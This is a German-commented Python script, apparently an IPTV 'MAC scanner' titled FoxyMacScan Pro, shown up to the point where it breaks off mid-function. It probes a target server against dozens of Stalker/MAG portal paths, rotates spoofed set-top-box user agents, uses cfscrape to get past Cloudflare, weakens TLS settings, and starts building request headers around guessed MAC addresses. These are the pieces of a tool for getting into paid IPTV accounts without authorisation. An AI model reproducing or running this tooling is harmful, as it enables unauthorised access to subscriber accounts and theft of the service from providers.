"""
    @author Python Script by Foxy Kronfeld
    Update: mehr MAC-Bereiche und mehr Portal-Typen eingefuegt
"""
version: str = 'V3.9'
import datetime
import os
import random
import re
import subprocess
import sys
import warnings
import logging
import hashlib
import pip, time
import uuid
import json


warnings.filterwarnings("ignore", category=DeprecationWarning)

os.system('cls' if os.name == 'nt' else 'clear')

# Install Routine für fehlende Module
def install(package):
    print( f"{package} modul nicht installiert \n {package} modul wird installiert... \n" )
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

#logging.basicConfig(level=logging.INFO)
# Import bzw. Install fehlender Module
try:
    import platform
except ImportError:
    install("platform")
    import platform
# Definition Fenster Py Titel
NOME = 'FoxyMacScan Pro ' + version
if sys.platform.startswith('win'):
    import ctypes

    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')

# Routine Bildschirm löschen Windows oder Android
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Dein Nick hier eintragen z.B. "Foxy_Kr" für nur ENTER bei Abfrage
nick = "𝙁𝙤𝙭𝙮 𝙆𝙧𝙤𝙣𝙛𝙚𝙡𝙙"
# Aufruf Bildschirm löschen
clear_screen()
# Pfad für Windows und Android
my_os = platform.system()
rootDir = "./" if my_os == "Windows" else "/storage/emulated/0/"
my_os = "Windows" if my_os == "Windows" else "Android"
print("OS system : ", my_os)

# Prüfen und anlegen fehlender Verzeichnisse
combo_dir = 'combo/'
save_hits = 'Hits/'
os.makedirs(rootDir + combo_dir, exist_ok=True)
os.makedirs(rootDir + save_hits, exist_ok=True)

# Import und gegebenenfalls Install fehlender Module
try:
    import requests
except ImportError:
    install('requests==2.27.1' if sys.version_info < (3, 7) else 'requests')
    import requests


try:
    import sock
except ImportError:
    install("requests[socks]")
    install("sock")
    install("PySocks")
    import sock

try:
    import textwrap
except ImportError:
    install("textwrap")
    import textwrap



try:
    import threading
    from threading import Thread
except ImportError:
    install('threading')
    raise

try:
    import colorama
except ImportError:
    install('colorama==0.4.4' if sys.version_info < (3, 7) else 'colorama')
from colorama import init, Fore, Style
init()

try:
    import urllib3
except ImportError:
    install('urllib3==1.21.1' if sys.version_info < (3, 7) else 'urllib3')
    import urllib3

try:
    import concurrent.futures
except ImportError:
    install('concurrent.futures')
    import concurrent.futures


try:
    import flag
except ImportError:
    install('emoji-country-flag==0.1.0' if sys.version_info < (3, 7) else 'emoji-country-flag')
    import flag


# Routine prüfen m3u-Link
def is_valid_url(m3u_url):
    try:
        response = requests.get(m3u_url)  # hinzugefuegt , allow_redirects=False)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

panel = ""
# Routine Farbausgabe http-requests
def color_code(response_code):
    if response_code > 451:
        return '\33[1;31m'  # rot
    elif 400 <= response_code <= 451:
        return '\33[1;33m'  # gelb
    else:
        return '\33[1;32m'  # grün


print(Style.RESET_ALL)

def unicode(fyz):
    cod=fyz.encode('utf-8').decode("unicode-escape").replace('\/','/')
    return cod

def duzel2(veri, vr):
    data = ""
    try:
        data = veri.split('"{}":"'.format(vr))[1]
        data = data.split('"')[0]
        data = data.replace('"', '')
    except (ValueError, AttributeError, TypeError):
        pass
    return str(data)


# Splitt Domain-Url ohne Port
global fsp, dom, domnp
import urllib.parse
from urllib.parse import urlparse
def clear_domain(dom_url):
    global fsp, dom, domnp
    if not dom_url == '':
        dom_url = dom_url.replace(" ", "")
    if not dom_url.startswith(httpX):
        dom_url = httpX + dom_url
    parsed_url = urlparse( dom_url )
    domain = parsed_url.hostname
    port = parsed_url.port
    if port is None:
        port = "80"
    dom = f'{domain}:{port}'
    domnp = domain
    fsp = dom_url
    return dom

# Definition globaler Variablen
global uagent, uagentp

clear_screen()

import logging
#from urllib3.exceptions import InsecureRequestWarning

# Set the custom ciphers string
custom_ciphers = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:"
    "TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:"
    "TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:"
    "TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:"
    "TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:"
    "TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:"
    "TLS13-AES-128-GCM-SHA256:"
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384"
)
# request Fehlermeldung ausschalten
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Sort the ciphers by name
sorted_ciphers = ', '.join(sorted(custom_ciphers.split(':')))

# Set the custom ciphers in requests.packages.urllib3.util.ssl_
urllib3.util.ssl_.DEFAULT_CIPHERS = sorted_ciphers
# Tabelle verschiedener User Agenten

user_agents_list = [
    'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)',
    'VU IPTV Player/1.0.0 (Android/10.0; VU-IPTV-Player-Model-A; VU Technologies; armv7l; en-US)',
    'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1',
    'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01',
    'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; Nautilus/1.0Final) Gecko/20020408',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 [ip:127.0.0.1:80]',
    'Mozilla/5.0 (Linux; Andr0id 10; BRAVIA 4K VH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 OPR/46.0.2207.0 OMI/4.21.0.273.DIA6.142 HbbTV/1.5.1 (+DRM; Sony; KD-43X81J; PKG6.3628.0454EUA; ; com.sony.HE.G4.4K; ) sony.hbbtv.',
    'Mozilla/5.0 (X11; FreeBSD; U; Viera; de-DE) AppleWebKit/537.11 (KHTML, like Gecko) Viera/3.10.14 Chrome/23.0.1271.97 Safari/537.11',
    'Fire OS/8.0 stagefright/1.2 (Linux;Android 11)',
    'Dalvik/2.1.0 (Linux; U; Android 11; M2101K9G Build/RKQ1.201112.002)',
    'Dalvik/2.1.0 (Linux; U; Android 14; SM-G996B Build/UP1A.231005.007)',
    'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34',
    'Lavf58.20.100',
    'stagefright/1.2 (Linux;Android 5.0)',
    'AppleCoreMedia/1.0.0.17C54 (Apple TV; U; CPU OS 13_3 like Mac OS X; de_de)',
    'Movian/5.0.488 (Linux; 4.4.0-59-generic; x86_64) CE-4300',
    'Roku/DVP-9.10 (519.10E04154A)',
    'Dalvik/2.1.0 (Linux; U; Android 9; unifi TV STB Build/PPR1.180610.011)',
    'MXPlayer/1.13.2 (Linux;Android)',
    'AppleCoreMedia/1.0.0.15L211 (Apple TV; U; CPU OS 11_3 like Mac OS X; en_us)',
    'CrKey armv7l 1.5.16041',
    'Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002)',
    'Roku4640X/DVP-7.70 (297.70E04154A)',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 6 rev: c8a6f17 Mobile Safari/533.3',
    'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/534.34',
    'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: '+str(
        random.randint(999, 9999))+' Mobile Safari/533.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0.2',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Yandex/21.6.0.757 Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 Cloudflare/',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v4733660962554755729 t2497289493676473249 ath5ee645e0 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v7771714704404601127 t1767466739701511137 ath5ee645e0 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v861747217415728694 t6465497452541338825 ath1fb31b7a altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8213193423415633580 t1275151446570656471 ath2653ab72 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2009320957625047638 t5464989352225492596 ath5ee645e0 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v5502165208 t8051835847380388763 athfa3c3975 altpub cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v16946067360 t3603465970957983448 athfa3c3975 altpub cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v3030385416276164466 t2730424428714240100 ath5ee645e0 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7757080540778426782 t7271642332048547083 ath2653ab72 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3338369353697079018 t1449489741997166281 ath4b3726d5 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v16946103773 t3603465970957983448 athfa3c3975 altpub cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v8401392677576500100 t2497289493676473249 ath5ee645e0 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v940321612475978281 t39418013216578466 ath1fb31b7a altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v5502189015 t8051835847380388763 athfa3c3975 altpub cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5930865162840484365 t3528263261712605499 ath259cea6f altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v4815373457863487877 t4553224442884356119 ath1fb31b7a altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v763544774673068020 t3528263261712605499 ath259cea6f altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8636082276347612393 t2180923617775657619 athe94ac249 altpriv cvcv=2 smf=0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 RuxitSynthetic/1.0 v4859367141743631826 t5464989352225492596 ath5ee645e0 altpriv cvcv=2 smf=0'
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/132.0',
    #Amazon Fire TV
    'Mozilla/5.0 (Linux; Android 9; Fire TV Stick 4K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/80.1.1.0',
    #Apple TV
    'AppleTV/12.0.0 (Apple TV; 4th generation)',
    #Android TV
    'Mozilla/5.0 (Linux; Android 10; Android TV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
    #NVIDIA Shield TV
    'Mozilla/5.0 (Linux; Android 9; NVIDIA Shield TV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
    #Xiaomi Mi Box
    'Mozilla/5.0 (Linux; Android 8.0.0; Mi Box S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    #Samsung Smart TV
    'Mozilla/5.0 (Linux; Tizen 4.0; SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/1.0',
    #Sony PlayStation
    'Mozilla/5.0 (PlayStation 4 6.50) AppleWebKit/537.73.14 (KHTML, like Gecko)',
    #LG Smart TV
    'Mozilla/5.0 (Linux; WebOS 3.5; SmartTV) AppleWebKit/537.36 (KHTML, like Gecko)'
    #Samsung Smart TV (Tizen 6.0)
    'Mozilla/5.0 (SMART-TV; Linux; Tizen 6.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0',
    #Philips Smart TV (Android 9)
    'Mozilla/5.0 (Linux; Android 9; Philips TV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
    ]

from requests import Session

# Configure logging
logging.basicConfig(level=logging.INFO)
try:
    import cfscrape
    ses = cfscrape.create_scraper(sess=Session())
    #logging.info("cfscrape is used to create the session.")
except ImportError:
    ses = Session()
    #logging.warning("cfscrape not found; using regular requests session.")
    logging.captureWarnings(True)


from datetime import datetime

current_date = datetime.now()
scan_date = current_date.strftime("%d-%m-%Y")
#count1 = 0
hitc = 0
cpm = 0
ip = ""


# Tabelle für Anfrage Portal je nach Typ
payload = [
    '/portal.php',
    '/server/load.php',
    '/stalker_portal/server/load.php',
    '/stalker_u.php',
    '/BoSSxxxx/portal.php',
    '/c/portal.php',
    '/c/server/load.php',
    '/magaccess/portal.php',
    '/portalcc.php',
    '/bs.mag.portal.php',
    '/magportal/portal.php',
    '/maglove/portal.php',
    '/tek/server/load.php',
    '/emu/server/load.php',
    '/emu2/server/load.php',
    '/xx/server/load.php',
    '/portalott.php',
    '/ghandi_portal/server/load.php',
    '/magLoad.php',
    '/ministra/portal.php',
    '/portalstb/portal.php',
    '/xx/portal.php',
    '/portalmega.php',
    '/portalmega/portal.php',
    '/rmxportal/portal.php',
    '/portalmega/portalmega.php',
    '/powerfull/portal.php',
    '/korisnici/server/load.php',
    '/nettvmag/portal.php',
    '/cmdforex/portal.php',
    '/k/portal.php',
    '/p/portal.php',
    '/cp/server/load.php',
    '/extraportal.php',
    '/Link_Ok/portal.php',
    '/delko/portal.php',
    '/delko/server/load.php',
    '/bStream/portal.php',
    '/bStream/server/load.php',
    '/blowportal/portal.php',
    '/client/portal.php',
    '/server/move.php',
    '/stalker_portal/portal.php',
    '/KPZDeDLv/portal.php',
    '/stb/portal/portal.php'

]

# Definition Py Logo
plogo = ("""\33[33m\n                 
  ║▌█║      for MAC       ║▌█║ \33[0;1m
  ___ _____  ___   __   
 | __/ _ \ \/ \ \ / / 
 | _| (_) >  < \ V / MAC SCAN
 |_| \___/_/\_\ |_|  PRO """ + version + """
                                                            
\33[0m* \33[1;93;33mMAC FINDER PRO FOXY KRONFELD\33[0m *  """)
print(plogo)
pattern = "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
# Eingabe Nickname für Hit-Text
nick: str = input("""\33[0m\33[1;33m\nWie ist Dein Nickname...\33[0m\n
\33[1;91m[\33[0m?\33[1;91m]\33[0m\33[1;31m Nick Name: \33[1;33m""") or "𝙁𝙤𝙭𝙮 𝙆𝙧𝙤𝙣𝙛𝙚𝙡𝙙"
print('\33[0m')

clear_screen()
print(plogo)

fspclean =""
auto_typ =""


# Assuming payload, user_agents_list, and other global variables are defined elsewhere

def searchpanel():
    global fsp, dom, domnp, fspclean, auto_typ, panel, httpX
    init()
    auto_scan = "OFF"
    print("\n check Portal-Typ...")
    status_codes = {
        "200": (Fore.GREEN, "  (200)"),
        "401": (Fore.GREEN, " (401)"),
        "403": (Fore.RED, " (403)"),
        "512": (Fore.GREEN, " (512)"),
        "520": (Fore.RED, " (520)"),
        "404": (Fore.BLUE, " (404)"),
        "302": (Fore.YELLOW, " (302)"),
    }

    successful_types = {}
    for admin in payload:
        try:
            option = requests.Session()
            getrequest = option.get(httpX + dom + "/" + admin, headers={'User-Agent': random.choice(user_agents_list)},
                                      timeout=3, allow_redirects=False)  # war fsp
            statuscode = str(getrequest.status_code)
            if statuscode in ["200"]:
                auto_scan = f"{Fore.LIGHTWHITE_EX}Auto{Fore.GREEN}[ON]"
                successful_types[admin] = statuscode
                print(status_codes[statuscode][0] + status_codes[statuscode][1] + '\33[97m' + admin)
                if auto_typ != "":
                    auto_typ = admin
        except Exception:
            print(Fore.RED  + '\33[97m' + admin + Fore.RED + " Read timed out.")
        time.sleep(0.5)

    if successful_types:
        print( f"\n{Fore.LIGHTWHITE_EX}gefundene Typ(en):" )
        for i, (admin, statuscode) in enumerate( successful_types.items(), 1 ):
            if i != 1: auto_scan = ""
            print( f"{Fore.LIGHTWHITE_EX} {i}. {Fore.YELLOW} {admin}  {Fore.GREEN}({statuscode}) {auto_scan}" )
        if len( successful_types ) > 1:
            selection = input(
                f"{Fore.LIGHTWHITE_EX}Auswahl Nummer eines Types:\n\33[1;91m[\33[0m?\33[1;91m]\33[0m  " )
            selection = selection if selection else "1"
            selected_type = list(successful_types.keys())[int( selection ) - 1]
            print( f"{Fore.LIGHTWHITE_EX}verwendete Typ:\n {Fore.BLUE}http://{dom}{selected_type}" )
        else:
            selected_type = list(successful_types.keys())[0]
            print( f"{Fore.LIGHTWHITE_EX}verwendete Typ:\n {Fore.BLUE}http://{dom}{selected_type}" )
        auto_typ = selected_type
    else:
        print( f"{Fore.RED}keinen Typ gefunden." )
        time.sleep( 1 )
        print(f"{Fore.LIGHTWHITE_EX}Auswahl Typ manuell:")
        for i, element in enumerate( payload, 1 ):
            print( f"{i}. {element}" )
        selection = input( "Auswahl Nummer eines Types::\n\33[1;91m[\33[0m?\33[1;91m]\33[0m  " )
        auto_typ = payload[int( selection ) - 1]
        print( f"verwendete Typ: {Fore.YELLOW}{auto_typ}" )


httpX = "http://"

def start_py():
    global payload, auto_typ, panel
    payload = [
    '/portal.php',
    '/server/load.php',
    '/stalker_portal/server/load.php',
    '/stalker_u.php',
    '/BoSSxxxx/portal.php',
    '/c/portal.php',
    '/c/server/load.php',
    '/magaccess/portal.php',
    '/portalcc.php',
    '/bs.mag.portal.php',
    '/magportal/portal.php',
    '/maglove/portal.php',
    '/tek/server/load.php',
    '/emu/server/load.php',
    '/emu2/server/load.php',
    '/xx/server/load.php',
    '/portalott.php',
    '/ghandi_portal/server/load.php',
    '/magLoad.php',
    '/ministra/portal.php',
    '/portalstb/portal.php',
    '/xx/portal.php',
    '/portalmega.php',
    '/portalmega/portal.php',
    '/rmxportal/portal.php',
    '/portalmega/portalmega.php',
    '/powerfull/portal.php',
    '/korisnici/server/load.php',
    '/nettvmag/portal.php',
    '/cmdforex/portal.php',
    '/k/portal.php',
    '/p/portal.php',
    '/cp/server/load.php',
    '/extraportal.php',
    '/Link_Ok/portal.php',
    '/delko/portal.php',
    '/delko/server/load.php',
    '/bStream/portal.php',
    '/bStream/server/load.php',
    '/blowportal/portal.php',
    '/client/portal.php',
    '/server/move.php',
    '/stalker_portal/portal.php',
    '/KPZDeDLv/portal.php',
    '/stb/portal/portal.php'

    ]

    dom_url = input(f"\n{Fore.BLUE}Eingabe Panel http://f01.live:8080 \n         oder f01.live.com:8080 \n\33[1;91m[\33[0m?\33[1;91m]\33[0m ") or "http://f01.live:8080"

    clear_domain(dom_url)

    # check HTTP or HTTPS protocol
    url = dom
    panel = dom
    print( f"\n{Fore.LIGHTWHITE_EX}check Protocol-Typ [http oder https]" )
    parsed_url = urllib.parse.urlparse( url )
    if parsed_url.scheme == "https":
        httpX: str = "https://"
        print(f"{Fore.LIGHTWHITE_EX}URL verwendet {Fore.YELLOW}HTTPS{Fore.LIGHTWHITE_EX} Verbindung.")
    else:
        httpX: str = "http://"
        print(f"{Fore.LIGHTWHITE_EX}URL verwendet {Fore.YELLOW}HTTP{Fore.LIGHTWHITE_EX} Verbindung.")
    print(f"\nPanel-Typ: {Fore.YELLOW}{auto_typ}")
    panel = dom
    searchpanel()
    time.sleep(1.5)

start_py()




# Tabelle Portal-Typen
panel_typ = """
   1 -> /portal.php   
   2 -> /server/load.php
   3 -> /stalker_portal/server/load.php
   4 -> /stalker_u.php
   5 -> /BoSSxxxx/portal.php
   6 -> /c/portal.php
   7 -> /c/server/load.php
   8 -> /magaccess/portal.php
   9 -> /portalcc.php
  10 -> /bs.mag.portal.php
  11 -> /magportal/portal.php
  12 -> /maglove/portal.php
  13 -> /tek/server/load.php
  14 -> /emu/server/load.php
  15 -> /emu2/server/load.php
  16 -> /xx/server/load.php
  17 -> /portalott.php
  18 -> /ghandi_portal/server/load.php
  19 -> /magLoad.php
  20 -> /ministra/portal.php
  21 -> /portalstb/portal.php
  22 -> /xx/portal.php
  23 -> /portalmega.php
  24 -> /portalmega/portal.php
  25 -> /rmxportal/portal.php
  26 -> /portalmega/portalmega.php
  27 -> /powerfull/portal.php
  28 -> /korisnici/server/load.php
  29 -> /nettvmag/portal.php
  30 -> /cmdforex/portal.php
  31 -> /k/portal.php
  32 -> /p/portal.php
  33 -> /cp/server/load.php
  34 -> /extraportal.php
  35 -> /Link_Ok/portal.php
  36 -> /delko/portal.php
  37 -> /delko/server/load.php
  38 -> /bStream/portal.php
  39 -> /bStream/server/load.php
  40 -> /blowportal/portal.php
  41 -> /client/portal.php
  42 -> /server/move.php
  43 -> /stalker_portal/portal.php
  44 -> /stalker_portal/load.php
  45 -> /stb/portal/portal.php

\33[1;91m[\33[0m?\33[1;91m]\33[0m Wähle Portaltyp [Default 1]=\33[0m """
# Eingabe Portal URL
#input_panel = "\nPortal-Url z.B. http://mol-2.com:8080/c/\noder mol-2.com:8080 \n\n\33[1;91m[\33[0m?\33[1;91m]\33[0m Portal:Port = "
# Tabelle für Anfrage Portal je nach Typ
panel_map = {
    "1": "portal.php",
    "2": "server/load.php",
    "3": "stalker_portal/server/load.php",
    "4": "stalker_u.php",
    "5": "BoSSxxxx/portal.php",
    "6": "c/portal.php",
    "7": "c/server/load.php",
    "8": "magaccess/portal.php",
    "9": "portalcc.php",
    "10": "bs.mag.portal.php",
    "11": "magportal/portal.php",
    "12": "maglove/portal.php",
    "13": "tek/server/load.php",
    "14": "emu/server/load.php",
    "15": "emu2/server/load.php",
    "16": "xx/server/load.php",
    "17": "portalott.php",
    "18": "ghandi_portal/server/load.php",
    "19": "magLoad.php",
    "20": "ministra/portal.php",
    "21": "portalstb/portal.php",
    "22": "xx/portal.php",
    "23": "portalmega.php",
    "24": "portalmega/portal.php",
    "25": "rmxportal/portal.php",
    "26": "portalmega/portalmega.php",
    "27": "powerfull/portal.php",
    "28": "korisnici/server/load.php",
    "29": "nettvmag/portal.php",
    "30": "cmdforex/portal.php",
    "31": "k/portal.php",
    "32": "p/portal.php",
    "33": "cp/server/load.php",
    "34": "extraportal.php",
    "35": "Link_Ok/portal.php",
    "36": "delko/portal.php",
    "37": "delko/server/load.php",
    "38": "bStream/portal.php",
    "39": "bStream/server/load.php",
    "40": "blowportal/portal.php",
    "41": "client/portal.php",
    "42": "server/move.php",
    "43": "stalker_portal/portal.php",
    "44": "stalker_portal/load.php",
    "45": "stb/portal/portal.php"
}
realblue = ""


def get_portal_idx():
    global realblue, panel, portal_idx
    panel = input(panel_typ) or "1"
    if panel == "20":  # war 4
        realblue = "real"
        panel = input(panel_typ)
    portal_idx = panel_map[panel]
    return portal_idx

def generate_cloudflare_headers(mac):
    global httpX, portal_idx, panel
    import random
    macs=mac.upper().replace(':', '%3A')
    #macs=urllib.parse.quote(mac)
    if portal_idx=="stalker_portal/server/load.php":
        panell=panel+'/stalker_portal/'
    else:
        panell=panel
    # List of country codes (ISO 3166-1 alpha-2)
    country_codes = [
        "US", "CA", "GB", "AU", "DE", "FR", "JP", "IN", "IT", "BR",
        "CN", "RU", "ES", "KR", "MX", "NL", "PL", "TR", "CH", "SE",
        # Add more country codes as needed
    ]

    # List of user agents
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
